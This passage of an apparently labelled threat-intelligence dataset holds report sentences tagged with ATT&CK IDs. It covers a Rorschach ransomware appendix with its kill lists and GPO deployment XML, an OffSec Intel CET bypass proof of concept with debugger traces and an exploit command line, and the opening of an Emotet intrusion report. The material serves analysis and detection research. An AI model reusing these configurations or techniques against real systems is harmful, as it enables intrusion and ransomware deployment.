            "Samples/IOCs Files NameHashCommentscy.exe2237ec542cdcd3eb656e86e43b461cd1PA Cortex Dump Service Tool (benign file)winutils.dll4a03423c77fe2c8d979caca58a64ad6cLoader and injector into notepad.execonfig.ini6bd96d06cd7c4b084fe9346e55a81cf9Encrypted ransomware payloadAppendix A \u2013 Services and processes terminated through GPO by Rorschach The following services are stopped through a GPO issued by Rorschach, probably to prevent conflicting write orders to Database files (and thus preventing encryption): SQLPBDMSSQLPBENGINEMSSQLFDLauncherSQLSERVERAGENTMSSQLServerOLAPServiceSSASTELEMETRYSQLBrowserSQL Server Distributed Replay ClientSQL Server Distributed Replay ControllerMsDtsServer150SSISTELEMETRY150SSISScaleOutMaster150SSISScaleOutWorker150MSSQLLaunchpadSQLWriterSQLTELEMETRYMSSQLSERVERThe following processes are killed using a group policy (scheduled task) issued by Rorschach executing C:\\windows\\system32\\taskkill.exe.",
            "Some are likely terminated to prevent write conflicts, and some are security solutions: wxServer.exewxServerView.exesqlmangr.exeRAgui.exesupervise.exeCulture.exeDefwatch.exehttpd.exesync-taskbarsync-workerwsa_service.exesynctime.exevxmon.exesqlbrowser.exetomcat6.exeSqlservr.exeAppendix B \u2013 Hardcoded Rorschach configuration ",
            "The following is a list of services, hardcoded in its configuration, to be stopped via the service control manager: AcronisAgentAcrSch2SvcbackupBackupExecAgentAcceleratorBackupExecAgentBrowserBackupExecDiveciMediaServiceBackupExecJobEngineBackupExecManagementServiceBackupExecRPCServiceBackupExecVSSProviderCAARCUpdateSvcCASAD2DWebSvcccEvtMgrccSetMgrDefWatchGxBlrGxCIMgrGxCVDGxFWDGxVssIntuit.",
            "QuickBooks.",
            "FCSmemtasmepocsPDVFSServiceQBCFMonitorServiceQBFCServiceQBIDPServiceRTVscanSavRoamsophossqlstc_raw_agentsvc$veeamVeeamDeploymentServiceVeeamNFSSvcVeeamTransportSvcVSNAPVSSvssYooBackupYooITzhudongfangyuThe following is a hardcoded list of directories and files to be omitted from encryption: ...",
            "#recycle$Recycle.",
            "Bin1_config.iniAhnlabAll UsersAppDataAUTOEXEC.BATautoexec.batautorun.infbegin.txtBootboot.inibootfont.binbootmgfw.efibootmgrbootmgr.efibootsect.bakconfig.inidesktop.inifinish.txtGoogleiconcache.dbInternet",
            "ExplorerMozillaMozilla FirefoxNETLOGONntldrntuser.datNTUSER.DATntuser.dat.logntuser.dat.",
            "LOG1ntuser.dat.",
            "LOG2ntuser.iniOperaOpera SoftwarePoliciesProgram",
            "FilesProgram Files (x86)ProgramDatascriptsSYSVOLthumbs.dbTor BrowserWindowsWINDOWSWindows.oldThe",
            "following is a list of process names that during Rorschach\u2019s execution these names are compared to those running on the machine and killed if matched.",
            "This is done through a combination of CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, OpenProcess, and TerminateProcess.",
            "There is some overlap and redundancy to the list of services killed via the service control manager. AcronisAgentAcrSch2Svcagntsvc.exeBackExecRPCServicebackupBackupExecAgentAcceleratorBackupExecDiveciMediaServiceBackupExecJobEnginebedbgCAARCUpdateSvcccEvtMgrCulserverdbeng50.exedbeng8dbsnmp.exedbsrv12.exeDefWatchencsvc.exeexcel.exefirefox.exeinfopath.exeIntuit.",
            "FCSisqlplussvc.exememtasmepocsmsaccess.exeMSExchangemsftesql-Exchangemsmdsrvmspub.exeMSSQLmydesktopqos.exemydesktopservice.exeocautoupds.exeocomm.exeocssd.exeonenote.exeoracle.exeoutlook.exePDVFSServicepowerpnt.exeQBCFMonitorServiceQBFCServiceQBIDPServiceSavRoamsophossqbcoreservice.exesql.exesqladhlpSQLADHLPsqlagentSQLAgentSQLAgent$SHAREPOINTSQLBrowserSQLWritersteam.exesynctime.exetbirdconfig.exethebat.exethunderbird.exetomcat6veeamVeeamDeploymentServiceVeeamNFSSvcVeeamTransportSvcvisio.exevmware-convertervmware-usbarbitator64WinSAT.exewinword.exewordpad.exewrapper.exeWSBExchangexfssvccon.exeYooBackupAppendix C \u2013 Group Policies executed by Rorschach Transferring its own files to each workstation: <Files clsid=\"{215B2E53-57CE-475c-80FE-9EEC14635851}\"> <File clsid=\"{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}\" name=\"0305_winutils.dll\" status=\"0305_winutils.dll\" image=\"2\" changed=\"2023-03-05 08:51:22\" uid=\"{3F490769-A341-4220-90A3-51964B4A0C12}\" bypassErrors=\"1\"> <Properties action=\"U\" fromPath=\"\\\\**REDACTED**\\sysvol\\**REDACTED**.local\\scripts\\winutils.dll\" targetPath=\"%Public%\\winutils.dll\" readOnly=\"0\" archive=\"1\" hidden=\"0\" suppress=\"0\" /> </File> <File clsid=\"{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}\" name=\"0305_config.ini\" status=\"0305_config.ini\" image=\"2\" changed=\"2023-03-05 08:51:22\" uid=\"{F513F283-3C66-4C71-9B9B-4CE9BBFCEEF1}\" bypassErrors=\"1\"> <Properties action=\"U\" fromPath=\"\\\\**REDACTED**.local\\sysvol\\**REDACTED**.local\\scripts\\config.ini\" targetPath=\"%Public%\\config.ini\" readOnly=\"0\" archive=\"1\" hidden=\"0\" suppress=\"0\" /> </File> <File clsid=\"{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}\" name=\"0305_cy.exe\" status=\"0305_cy.exe\" image=\"2\" changed=\"2023-03-05 08:51:22\" uid=\"{0A16D469-2648-4849-99C8-95D1B777D59A}\" bypassErrors=\"1\"> <Properties action=\"U\" fromPath=\"\\\\**REDACTED**.local\\sysvol\\**REDACTED**.local\\scripts\\cy.exe\" targetPath=\"%Public%\\cy.exe\" readOnly=\"0\" archive=\"1\" hidden=\"0\" suppress=\"0\" /> </File> </Files> ",
            "Executing a scheduled task to run the attack: <TaskV2 clsid=\"{D8896631-B747-47a7-84A6-C155337F3BC8}\" name=\"2_0305_cy.exe\" image=\"2\" changed=\"**REDACTED**\" uid=\"{3772E17D-6354-4DF1-A73B-8868AC352B23}\"> <Properties action=\"U\" name=\"2_0305_cy.exe\" runAs=\"%LogonDomain%\\%LogonUser%\" logonType=\"InteractiveToken\"> <Task version=\"1.2\"> <RegistrationInfo> <Author>**REDACTED**\\Administrador</Author> <Description></Description> </RegistrationInfo> <Principals> <Principal id=\"Author\"> <UserId>%LogonDomain%\\%LogonUser%</UserId> <LogonType>InteractiveToken</LogonType> <RunLevel>HighestAvailable</RunLevel> </Principal> </Principals> <Settings> <IdleSettings> <Duration>PT10M</Duration> <WaitTimeout>PT1H</WaitTimeout> <StopOnIdleEnd>false</StopOnIdleEnd> <RestartOnIdle>false</RestartOnIdle> </IdleSettings> <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy> <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries> <AllowHardTerminate>true</AllowHardTerminate> <AllowStartOnDemand>true</AllowStartOnDemand> <Enabled>true</Enabled> <Hidden>false</Hidden> <ExecutionTimeLimit>P3D</ExecutionTimeLimit> <Priority>7</Priority> </Settings> <Triggers> <RegistrationTrigger> <Enabled>true</Enabled> </RegistrationTrigger> <LogonTrigger> <Enabled>true</Enabled> </LogonTrigger> </Triggers> <Actions Context=\"Author\"> <Exec> <Command>%Public%\\cy.exe</Command> <Arguments>--run=**REDACTED**</Arguments> </Exec> </Actions> </Task> </Properties> </TaskV2> "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1574.002"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1574.002",
                "T1027"
            ],
            [],
            [
                "T1574.002"
            ],
            [
                "T1055",
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1562.001"
            ],
            [
                "T1562.001",
                "T1484.001"
            ],
            [
                "T1070.004"
            ],
            [
                "T1484.001"
            ],
            [
                "T1484.001"
            ],
            [
                "T1053.005"
            ],
            [
                "T1484.001",
                "T1053.005"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [
                "T1027",
                "T1140"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [
                "T1106"
            ],
            [
                "T1106"
            ],
            [],
            [
                "T1027",
                "T1106"
            ],
            [
                "T1027",
                "T1059.003"
            ],
            [
                "T1059.003"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1057"
            ],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Bypassing Intel CET with Counterfeit Objects  OffSec",
        "cti_report": [
            "title: Bypassing Intel CET with Counterfeit Objects | OffSec url: https://www.offsec.com/offsec/bypassing-intel-cet-with-counterfeit-objects/ Bypassing Intel CET with Counterfeit Objects Matteo Malvica Content Developer Since its inception in 2005, return-oriented programming (ROP) has been the predominant avenue to thwart W^X mitigation during memory corruption exploitation. ",
            "While Data Execution Prevention (DEP) has been engineered to block plain code injection attacks from specific memory areas, attackers have quickly adapted and instead of injecting an entire code payload, they resorted in reusing multiple code chunks from DEP-allowed memory pages, called ROP gadgets.",
            "These code chunks are taken from already existing code in the target application and chained together to resemble the desired attacker payload or to just disable DEP on a per page basis to allow the existing code payloads to run. ",
            "To permanently block ROP attacks, a new hardware-enforced Control Flow Integrity mitigation called Control Enforcement Technology (CET) has been developed by Intel and first shipped on Windows systems roughly two years ago. ",
            "At first, the advent of CET painted a bleak picture future for exploit developers and their reliance on ROP-based techniques.",
            "However, in 2015, a new code-reuse technique named Counterfeit Object-Oriented Programming (COOP) has been formulated in a paper which seemed quite promising in defeating Control-Flow Integrity (CFI) defenses. ",
            "In this blog, we\u2019ll briefly cover how CFI mitigations works, including CET, and how we can leverage COOP to effectively bypass Intel CET on the latest Windows releases. ",
            "Forward-Edge and Backward-Edge CFI Control Flow Integrity mechanisms can be grouped into two main categories: forward-edge and backward-edge. ",
            "Forward-edge CFI, like Microsoft CFG, protects indirect function calls through the use of verified function addresses.",
            "For instance, if we overwrite the pointer dereferenced in a CALL [rax] instruction with a ROP gadget address, CFG will block our exploit by throwing an exception. ",
            "Conversely, backward-edge CFI like Intel\u2019s CET protects a function\u2019s return address by comparing it to a previously saved version of the address that is stored on the Shadow Stack.",
            "If the original return address gets overwritten during a memory corruption exploit, the address comparison will inevitably fail and the application will be terminated.",
            "Given that ROP-based attacks execute \u201cRET\u201d instructions without a prior \u201cCALL\u201d instruction, the running thread\u2019s stack and the shadow stack values mismatch and so backward-edge CFI like CET effectively blocks this attack technique. ",
            "Intel CET has been designed to mitigate ROP attacks through both the Shadow Stack and COP/JOP via Indirect Branch Tracking (IBT).",
            "However since the latter technology has not yet been implemented on Windows, in this blog post we are going to refer to \u201cIntel CET\u201d as the implementation with only Shadow Stack enabled. ",
            "CET internals have been documented extensively in previous researches [6][7] and we have already demonstrated how the mitigation works and on which major software CET has been deployed.",
            "At the time of this writing the landscape hasn\u2019t changed much and every major browser continues to run CET on every process except the renderer process.",
            "This means that the way CET is currently implemented is quite ineffective because the renderer process is the one that gets typically exploited. ",
            "Even though CET is still not widely enforced on browsers we should expect it to be enforced on every process over the coming years.",
            "To avoid getting caught unprepared, as researchers, we should improve our tradecraft and constantly learn about newly developed attack angles.",
            "Additionally, no matter how impeding a mitigation might be, we need to broaden our horizon if we want to find any weaknesses. ",
            "Counterfeiting Objects As mentioned in this post\u2019s premise, a novel code reuse technique named Counterfeit Object-Oriented Programming or COOP has been put together by Felix Schuster in 2015.",
            "We should note that this paper is quite theoretical.",
            "The technique has not been observed implemented in the wild or in disclosed exploits.",
            "Our goal for this blog post is to try to leverage this theoretical approach and implement it in a proof of concept in order to bypass Intel CET. ",
            "The main idea behind this technique is counterfeiting \u2013 that is crafting new objects in-memory from attacker-controlled payloads and to chain them together through virtual functions that are already present in the target application or in loaded libraries. ",
            "Each virtual function contained in a counterfeit object is called a vfgadget and is responsible for performing a small task.",
            "Similarly to ROP, vfgadgets can perform tasks like populating a value into a register.",
            "However when grouped together, multiple vfgadgets can execute more advanced operations. ",
            "As no specific tools exist today to discover vfgadgets, they can be found through custom scripts such as IDAPython, using a process similar to ROP gadget discovery. ",
            "Since vfgadgets are picked from a pool of CFG-valid functions we can mark them as legitimate, and their execution will not be blocked by CFG once we hijack an indirect call with one of them. ",
            "In addition, an interesting corollary is that Intel CET won\u2019t be triggered since we won\u2019t corrupt any function return address during the process of calling vfgadgets in sequence. ",
            "As illustrated in Schuster\u2019s paper, a typical COOP payload begins with a foundational vfgadget that acts as the COOP\u2019s main function.",
            "We\u2019ll refer to it as Looper in this blog post.",
            "Once the attacker has assembled the counterfeit object in memory, the Looper vfgadget iterates over an array of other vfgadgets, carefully prearranged by the attacker, which will be invoked one by one.",
            "By aligning the vfgadgets in the counterfeit object in such a way, we\u2019ll be able to call valid virtual functions in a controlled manner. ",
            "Once the Looper is running, it can then call other vfgadgets that are responsible for executing specific operations, like Argument LoadersInvokers and Collectors.",
            "These vfgadgets will be stored at regular intervals within the the array accessed by the Looper. ",
            "An Argument Loader vfgadget populates a given register by loading a value into it.",
            "The value to be loaded will be stored inside the counterfeit object at an offset from the beginning of the fake object. ",
            "Once the registers are populated by one or more Argument Loaders, an Invoker vfgadget can be called to simply execute the function pointer of the target API. ",
            "Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker\u2019s counterfeit object (i.e. as a returned value from an invoked API). ",
            "The following graph sum-up the COOP attack strategy discussed so far. ",
            "COOP attack flow We can arrange and mix different vfgadgets based on their availability and the desired APIs that we want to execute. ",
            "In order to better understand a COOP attack, let\u2019s start by analyzing the main vfgadget, the Looper.",
            "The following assembly code provides a simplified version of a Looper COOP vfgadget: mov rbx, [rcx+0x40] loop_start: mov rax, [rbx] call cs:__guard_dispatch_icall_fptr mov rbx, [rbx+20h] test rbx, rbx jnz short loop_start ... ",
            "loop_exit: ret Looper Gadget relevant ASM code On the first line, RCX holds the this pointer and we load into RBX the start of the counterfeit object that has been placed at offset 0x40 from RCX.",
            "Since all the items in our counterfeit objects will be referenced at offsets from thethis pointer, we need to make sure to save its value before hijacking the program flow (i.e by corrupting a vtable). ",
            "The COOP payload base address is then dereferenced into RAX which points to the first vfgadget that gets called.",
            "Once the call returns, a new vfgadget is loaded at offset 0x20 from the previous gadget and if the content of RBX is not zero, a new iteration of the loop takes place. ",
            "While writing our counterfeit object in memory, we need to align upfront each vfgadget to match the Looper offsets, similarly to the following layout: ",
            "The COOP buffer in memory Here, 00000227`26cd8900 is the base address of our COOP payload, which is stored at offset 0x40 from the this pointer (RCX).",
            "From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget.",
            "On the next loop iteration the Looper repeats the same task by loading a pointer at offset 0x20 from the previous one and ultimately invokes the second vfgadget. ",
            "When exploiting real-world targets such browsers, it is recommended to rely on the Looper vfgadget because it gives more control and stability over the other vfgadgets.",
            "However, for the sake of brevity, we wrote our vulnerable application with only a single Invoker vfgadget which accepts one argument, as we\u2019ll see in the next section. ",
            "Having covered introductory COOP theory, let\u2019s move on to exploiting a CET-compiled proof of concept application that we developed to showcase COOP attacks. ",
            "Bypassing the CET Shadow Stack with COOP The vulnerable application we wrote is compiled with CET and CFG in addition to DEP, which is on by default. ",
            "First off, to verify that CET is really enforced, we place a breakpoint on printf, inspect the call-stack, overwrite the return address and resume execution. ",
            "0:000> bp printf 0:000> g 0:000> k # Child-SP RetAddr Call Site 00",
            "00000000`0014fde8",
            "00000001`400180e8 coop!printf",
            "[C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.19041.0\\ucrt\\stdio.h @ 956] 01 00000000`0014fdf0",
            "00000001`40018d54 coop!main+0x28",
            "[C:\\Users\\uf0\\source\\repos\\COOP\\COOP\\coop.cpp @ 54] 02 (Inline Function) --------`-------- coop!invoke_main+0x22",
            "[D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 78] 03 00000000`0014fef0 00007ffb`ec0a7034 coop!__scrt_common_main_seh+0x10c",
            "[D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcstartup\\src\\startup\\exe_common.inl @ 288] 04 00000000`0014ff30 00007ffb`ecba2651 KERNEL32!BaseThreadInitThunk+0x14 05",
            "00000000`0014ff60",
            "00000000`00000000",
            "ntdll!RtlUserThreadStart+0x21 0:000> dq 00000000`0014fde8 L1 00000000`0014fde8",
            "00000001`400180e8 0:000> eq 00000000`0014fde8",
            "414141414141 0:000> dq 00000000`0014fde8 L1 00000000`0014fde8 00004141`414141411 0:000>",
            "g (16c0.f68): Security check failure or stack buffer overrun - code c0000409 (!!!",
            "second chance !!!) ",
            "Subcode: 0x39 FAST_FAIL_CONTROL_INVALID_RETURN_ADDRESS Shadow stack violation coop!printf+0x56: 00000001`400187e6 c3 ret Verifying that CET is enforced We get confirmation that CET is enabled as we are immediately prompted with a Shadow Stack exception referring to an invalid return address. ",
            "As CET is a hardware-enforced mitigation, in order to trigger the above error we would need at least an 11th Generation Core \u2018Tiger Lake\u2019 CPU To simulate a browser vulnerability, we can obtain RIP control by taking advantage of a type confusion vulnerability in the application that is triggered automatically when the application is executed. ",
            "When we hit the trigger for the vulnerability, a vtable pointer gets corrupted by our input, leading to an indirect call that we have control over.",
            "We then hijack the vtable to make it point to our COOP buffer where our first (and only) vfgadget resides.",
            "As mentioned earlier, instead of using a Looper with nested vfgadget, for the sake of brevity, we opted to use a single gadget that features both the Invoker and Argument Loader components. ",
            "As part of the automated part of the exploit, in order to obtain the vfgadget\u2019s this pointer, we have leaked the stack pointer and retrieved the this pointer as a static offset from the stack. ",
            "Once we have obtained the this pointer address, we prepare the address of the Windows API we want to invoke along with its arguments.",
            "This is done by writing both the Windows API address and the arguments at the required offsets inside the counterfeit object. ",
            "Before exploring the COOP payload in more detail, let\u2019s first understand the PoC\u2019s syntax by running it without any arguments. ",
            "C:\\Users\\offsec\\source\\repos\\COOP\\x64\\Debug>coop.exe [-] SYNTAX: coop.exe <",
            "COOP obj ptr> <1st vfgadget> <WinAPI> <API argument> ",
            "[-] EXAMPLE - WinExec: coop.exe 00001e000000 5086014001000000 40610fecfb7f0000 \"cmd.exe /C calc\" [-] EXAMPLE - LoadLibraryA: coop.exe 00001e000000",
            "5086014001000000 f0040becfb7f0000 \"edgehtml.dll\" Getting the PoC\u2019s syntax The application accepts four parameters: a pointer to our counterfeit object (COOP) buffer, the vfgadget address, the Windows API address and its arguments.",
            "The helper shows two simple use-cases but this can be of course expanded to invoke any CFG-allowed API (if the application is compiled with it). ",
            "Since Windows DLLs will load at a random base address, it is required to calculate the desired API\u2019s address beforehand. ",
            "Let\u2019s first inspect the C++ code of the object related to our vfgadget, and then explore its corresponding assembly from the compiled binary: class OffSec { public: char* a; int (*callback)(char* a); ",
            "public: virtual void trigger(char* a1) { callback(a); } }; The \u2018trigger\u2019 method from which we derive the vfgadget The class OffSec present in the project contains a trigger method which acts as a C-style function pointer that we can abuse to invoke any API we like, as we\u2019ll see shortly.",
            "Then, the \u2018OffSec\u2019 class is instantiated in the main program routine so it gets loaded in memory along with its methods. ",
            "Taking a closer look at the Invoker in the disassembler reveals a few interesting aspects. ",
            "Invoker vfgadger Starting from the second to the fourth line, the this pointer, referenced by RCX, is first stored on the stack and then moved into RAX.",
            "Next, the value at offset 0x10 from RAX is dereferenced and moved into RAX.",
            "This value will be the API function pointer residing in our counterfeit object.",
            "Then at line 7 and 8 the first function argument is dereferenced at offset 0x8 from the this pointer and moved into RCX. ",
            "As we\u2019ll soon discover, the vulnerable application will take care of these offsets once we have submitted the parameters from the command line. ",
            "Having covered the main building blocks of our attack chain, let\u2019s try to run the PoC by passing the four arguments in order to gain code execution: C:\\> coop.exe 00001e000000",
            "5086014001000000 40610fecfb7f0000 \"cmd.exe /C calc\" Running the PoC application with all parameters With the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address. ",
            "As a final argument we pass the WinExec string argument.",
            "Note that all memory addresses are passed in little-endian format. ",
            "Once started, the application halts immediately, allowing us to attach the debugger to it.",
            "Before doing so, we launch Process Explorer to verify that the binary is actually running with Intel CET enabled. ",
            "Verifying that CET is enabled with Process Explorer Under the \u201cStack Protection\u201d column, Process Explorer confirms that CET is enforced for only the CET-compatible modules, meaning that the mitigation will be enforced for any module compiled with CET.",
            "This includes our application. ",
            "Once the debugger is attached, we place a breakpoint to the only indirect call present in the main function and continue execution. ",
            "0:001> bp 00000001`4001847e 0:001>",
            "bl 0 e",
            "Disable Clear 00000001`4001847e 0001 (0001) 0",
            ":**** coop!main+0x3d2 0:001> u 00000001`4001847e L1 coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr",
            "[coop!__guard_dispatch_icall_fptr (00000001`400c4020)] 0:000> dq 0x1e0000 L1 00000000`001e0000 00000001`400186a0 0:001>",
            "g Breaking at the Indirect Call We placed a breakoint at main+0x3d2 and verified that we have indeed an indirect call at that address.",
            "Next we dump the content of our counterfeit object located at the static address 0x1e0000, which holds a pointer to our vfgadget at 00000001400186a0 At main+0x3d2 is where the type confusion bug ignites and allows us to take control over RIP.",
            "As soon as we hit the breakpoint we inspect the value residing at our COOP buffer, which should be the first Invoker vfgadget.",
            "We let the application continue and verify that we indeed hit our breakpoint. ",
            "Breakpoint 0 hit coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)} 0:000>t ntdll!LdrpDispatchUserCallTarget: ",
            "00007ffb`ecbdc620 4c8b1d814d0f00 mov r11,qword ptr [ntdll!LdrSystemDllInitBlock+0xb8 (00007ffb`eccd13a8)]",
            "ds:00007ffb`eccd13a8=00007df600000000 0:000> ntdll!LdrpDispatchUserCallTarget+0x23: 00007ff8`7c5fc643 48ffe0 jmp rax {coop!OffSec::trigger (00000001`400186a0)} ... ",
            "0:000> coop!OffSec::trigger: 00000001`400186a0 4889542410 mov qword ptr",
            "[rsp+10h],rdx ss:00000000`0014fdf8=0000000000612b77 Landing on the first COOP vfgadget After tracing into the CFG LdrpDispatchUserCallTarge routine",
            "we jump to the Invoker vfgadget \u2018OffSec::trigger\u201d, proving that we have control over the program\u2019s execution flow.",
            "We then continue tracing inside the vfgadget: ",
            "0:000> t ... coop!OffSec::trigger+0x5: ",
            "00000001`40018655 48894c2408 mov qword ptr",
            "[rsp+8],rcx ss:00000000`0014fdf0=00000001400a1108 0:000> dq rcx L1 ",
            "00000000`00590d80 00000000`001e0000 0:000> t coop!OffSec::trigger+0xa: ",
            "00000001`4001865a 4883ec38 sub rsp,38h 0:000> coop!OffSec::trigger+0xe: 00000001`4001865e 488b442440 mov rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80 Moving the \u2018this\u2019 pointer into RAX In the above listing, the Invoker first saves the this pointer from RCX into the stack, and we also verify that it points to the base of our COOP buffer.",
            "On the last instruction the \u2018this\u2019 pointer is loaded into RAX, which will be used as a reference to invoke the API and its argument: 0:000> ",
            "coop!OffSec::trigger+0x13: 00000001`40018663 488b4010 mov rax,qword ptr [rax+10h] ds:00000000`00590d90={KERNEL32!WinExec (00007ffb`ec0f6140)} 0:000> ",
            "coop!OffSec::trigger+0x17: 00000001`40018667 4889442420 mov qword ptr [rsp+20h],rax ss:00000000`0014fdd0=000000000000001f 0:000> coop!OffSec::trigger+0x1c: 00000001`4001866c 488b442440 mov rax,qword ptr [rsp+40h] ss:00000000`0014fdf0=0000000000590d80 0:000> coop!OffSec::trigger+0x21: 00000001`40018671 488b4808 mov rcx,qword ptr [rax+8] ds:00000000`00590d88=00000000001e0080 0:000> dc 00000000001e0080 00000000`001e0080 ",
            "2e646d63 20657865 6320432f 00636c61 cmd.exe /C calc. ... ",
            "Loading WinExec parameters from the \u2018this\u2019 pointer First, at offset 0x10 we can see that WinExec address is loaded into RAX and then, three instructions later, the command parameter gets retrieved at offset 0x8. ",
            "Once we let execution continue, we invoke LdrpDispatchUserCallTarget again which in turn dispatches execution to WinExec and welcomes us with our calculator. ",
            "Successfully Calling WinExec ",
            "This completes our brief proof-of-concept where we demonstrated that we can bypass the Intel CET Shadow Stack and obtain arbitrary code execution via a COOP attack by calling CFG-allowed functions while simultaneously avoiding corrupting any return address. ",
            "The Visual Studio project for this PoC application can be found at the following URL. ",
            "Conclusions Intel CET provides yet another strong defensive mechanism that surely steps up the exploit development game.",
            "Nonetheless, new attack pathways such as COOP can be adopted to circumvent this mitigation.",
            "As we learned so far, COOP vfgadgets are inherently allowed by CFG and so, in a real-world scenario they could be chained together to circumvent Intel CET and possibly other CFI mitigations. ",
            "About The Author Matteo Malvica Content Developer Matteo Malvica is a content developer at Offensive Security focusing on vulnerability research, exploit development, reverse engineering and operating system internals. "
        ],
        "label": [
            [],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055"
            ],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1106",
                "T1055"
            ],
            [],
            [],
            [],
            [
                "T1106"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Emotet Strikes Again  LNK File Leads to Domain Wide Ransomware  The DFIR Report",
        "cti_report": [
            "title: Emotet Strikes Again - LNK File Leads to Domain Wide Ransomware -",
            "The DFIR Report url: https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/ ",
            "In June of 2022, we observed a threat actor gaining access to an environment via Emotet and operating over a eight day period.",
            "During this time period, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike.",
            "Remote access tools were used for command and control, such as Tactical RMM and Anydesk.",
            "The threat actors final actions included data exfiltration using Rclone and domain wide deployment of Quantum Ransomware. ",
            "We have observed similar traits in previous cases where Emotet and Quantum were seen. ",
            "Case Summary The intrusion began when a user double clicked a LNK file, which then executed encoded Powershell commands to download an Emotet DLL onto the computer.",
            "Once executed, Emotet setup a Registry Run Key to maintain persistence on the beachhead host. ",
            "Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network\u2019s domain controllers.",
            "These commands would go on to be repeated daily by the Emotet process.",
            "Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading. ",
            "Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.",
            "Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.",
            "Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host. ",
            "The threat actor then moved laterally to a workstation.",
            "They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.",
            "Next, they proceeded to transfer a beacon executable over SMB to the remote host\u2019s ProgramData directory.",
            "This beacon was then successfully executed via WMI and connected successfully to the threat actors server. ",
            "Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.",
            "They then proceeded to dump credentials from the LSASS process on the host.",
            "With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.",
            "This Cobalt Strike server stopped communicating shortly there after. ",
            "On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.",
            "Again, some net command discovery was run for domain admins and domain controller servers.",
            "A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller. ",
            "The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLL\u2019s.",
            "On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment. ",
            "On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.",
            "From this server, the threat actors were observed using Rclone to exfiltrate data from a file share server in the environment.",
            "The Mega.io service was the location the stolen data was sent. ",
